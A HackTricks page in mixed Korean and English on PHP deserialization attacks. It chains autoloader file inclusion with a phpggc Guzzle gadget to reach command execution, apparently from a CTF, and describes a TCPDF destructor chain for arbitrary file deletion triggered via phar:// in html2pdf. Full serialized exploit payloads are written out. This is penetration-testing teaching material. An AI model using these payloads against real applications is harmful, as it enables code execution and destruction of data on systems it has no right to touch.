# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

먼저, [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php)를 확인해야 합니다.

## PHP deserialization + spl_autoload_register + LFI/Gadget

우리는 **PHP deserialization in a webapp** 를 발견했지만 **`phpggc`** 안에 gadget에 취약한 라이브러리가 **no** 있습니다. 그러나 같은 컨테이너에는 취약한 라이브러리를 가진 **different composer webapp with vulnerable libraries** 가 있었습니다. 따라서 목표는 다른 webapp의 **load the composer loader of the other webapp** 를 로드하여, deserialization에 취약한 webapp 쪽의 gadget으로 그 라이브러리를 악용하는 **load a gadget that will exploit that library with a gadget** 를 실행하도록 하는 것입니다.

단계:

- **deserialization** 를 발견했고 현재 앱 코드에는 **isn’t any gadget**.
- 다음과 같이 **`spl_autoload_register`** 함수를 악용해 **load any local file with `.php` extension**.
- 이를 위해 클래스 이름이 **`$name`** 안에 들어가는 deserialization 을 사용합니다. 직렬화된 객체의 클래스 이름에는 **cannot use "/" or "."** 이지만, **code** 가 **replacing** the **underscores** ("\_") **for slashes** ("/"). 그래서 `tmp_passwd` 같은 클래스 이름은 `/tmp/passwd.php` 로 변환되고 the code will try to load it.\ A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> **파일 업로드**가 가능하고 **`.php` 확장자** 파일을 업로드할 수 있다면, 이 기능을 **직접 악용**해 이미 RCE를 얻을 수 있습니다.
  
In my case, I didn’t have anything like that, but there was inside the **same container** another composer web page with a **library vulnerable to a `phpggc` gadget**.

- 다른 라이브러리를 로드하려면 먼저 **다른 웹앱의 composer loader를 로드해야 합니다**(현재 애플리케이션의 로더는 다른 앱의 라이브러리에 접근하지 못하기 때문입니다). **애플리케이션의 경로를 알면**, 다음과 같이 아주 쉽게 달성할 수 있습니다: **`O:28:"www_frontend_vendor_autoload":0:{}`** (제 경우 composer loader는 `/www/frontend/vendor/autoload.php`에 있었습니다)
- 이제 다른 앱의 **composer loader를 로드할 수 있으므로**, 사용할 **`generate the phpgcc`** **payload를 생성**할 차례입니다. 제 경우 **`Guzzle/FW1`**을 사용했으며, 이를 통해 **파일시스템 내에 임의의 파일을 작성**할 수 있었습니다.
- 참고: 생성된 **gadget가 작동하지 않았습니다**, 작동시키기 위해 phpggc의 해당 페이로드인 **`chain.php`**를 **수정**하여 클래스의 **모든 속성(all the attributes)**을 **private에서 public으로** 변경했습니다. 그렇지 않으면 직렬화된 문자열을 역직렬화한 후 생성된 객체들의 속성에는 값이 없었습니다.
- 이제 다른 앱의 **composer loader를 로드하는 방법**과 **작동하는 phpggc payload**가 준비되었지만, gadget가 사용될 때 로더가 로드되도록 **이 모든 것을 SAME REQUEST에서 수행해야** 합니다. 이를 위해 두 객체를 포함한 직렬화된 배열을 다음과 같이 전송했습니다:
- **먼저 로더가 로드되고 그 다음 페이로드가 로드되는 것**을 볼 수 있습니다
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- 이제 우리는 **파일을 생성하고 쓸 수 있습니다**, 그러나 사용자는 **웹 서버 내부의 어떤 폴더에도 쓸 수 없었습니다**. 그래서 payload에서 볼 수 있듯이, PHP가 **`system`**으로 일부 **base64**를 호출하는 코드가 **`/tmp/a.php`**에 생성됩니다. 그런 다음, 우리가 LFI로 사용했던 **첫 번째 유형의 payload**를 재사용하여 다른 webapp의 composer loader를 통해 t**o load the generated `/tmp/a.php`** 파일을 로드할 수 있습니다. 그냥 그것을 deserialization gadget에 추가하세요:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**payload 요약**

- **Load the composer autoload** — 동일 컨테이너에 있는 다른 webapp의 composer autoload를 로드
- **Load a phpggc gadget** — 다른 webapp의 라이브러리를 악용하기 위해 phpggc gadget을 로드 (초기 취약 webapp의 라이브러리에는 gadget이 없음)
- 해당 gadget은 악성 명령을 포함한 PHP payload가 담긴 파일을 `/tmp/a.php`에 **생성(create a file with a PHP payload)** (webapp 유저는 어떤 webapp 폴더에도 쓰기 권한이 없음)
- 최종 페이로드는 생성된 php 파일을 로드(**load the generated php file**)하여 명령을 실행

이 deserialization을 **두 번 호출(call this deserialization twice)** 해야 했다. 내 테스트에서는 첫 번째 호출 시 `/tmp/a.php` 파일이 생성되었지만 로드되지는 않았고, 두 번째 호출에서야 제대로 로드되었다.

## TCPDF `__destruct` POP chain for arbitrary file deletion

When a real `TCPDF` instance is garbage-collected it calls `_destroy(true)`, iterates over `$this->imagekeys`, and `unlink()`s anything that looks like a cache file under `K_PATH_CACHE`. If an application performs `unserialize($user_data)` while the `TCPDF` class is loaded (e.g. it expects an array with an `html` key), you can supply a serialized object that sets:

- `file_id`를 `self::$cleaned_ids`에 없는 임의의 정수로 설정 (예: `-1`).
- `imagekeys`를 `K_PATH_CACHE`로 시작하거나 그렇게 보이도록 만들 수 있는 경로로 설정 (예: `/tmp/../tmp/do_not_delete_this_file.txt` when `K_PATH_CACHE` is `/tmp/`).

Example payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
The file is deleted as soon as the object falls out of scope. TCPDF 6.9.3 tightened the check to only remove paths with the `__tcpdf_<file_id>_` prefix inside `K_PATH_CACHE` and introduced `_unlink()` to block non-`file://` schemes, so older `Producer` versions are prime targets.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

spipu/html2pdf (≤5.3.0)는 TCPDF를 래핑하고 `src`/`privkey` 속성을 평범한 `file_exists()`로 검증하는 커스텀 `<cert>` 블록을 노출한다. PHP < 8.0에서는 `phar://` URL을 건드리는 어떤 파일시스템 함수도 Phar 메타데이터를 unserialize하게 만든다. 위에서 만든 악성 TCPDF 객체를 Phar 아카이브의 metadata에 넣으면 애플리케이션이 직접 `unserialize()`를 호출하지 않더라도 신뢰할 수 있는 POP를 얻을 수 있다.

1. `phar.readonly=0`로 Phar를 생성하고 stub/manifest를 이미지처럼 보이게 설정한 다음(예: `archive.phar`를 `archive.png`로 이름 변경) 직렬화된 TCPDF 객체를 Phar metadata에 저장한다.
2. 파일을 `/tmp/user_files/user_1/archive.png` 같은 접근 가능한 위치에 업로드/배치한다.
3. html2pdf가 공격자가 제어하는 경로를 해석하도록 `<cert>` 태그를 포함한 HTML을 제출한다:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
`file_exists()` 호출은 메타데이터를 역직렬화하고 TCPDF를 인스턴스화하며, 그 소멸자가 선택된 파일을 삭제하여 html2pdf를 강력한 `phar://` 진입점으로 만든다. 버전 5.3.1에서는 승인되지 않은 스킴을 차단하기 위해 `Security::checkValidPath()`가 추가되어 레거시 배포는 여전히 매력적이다.

## 참고자료

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
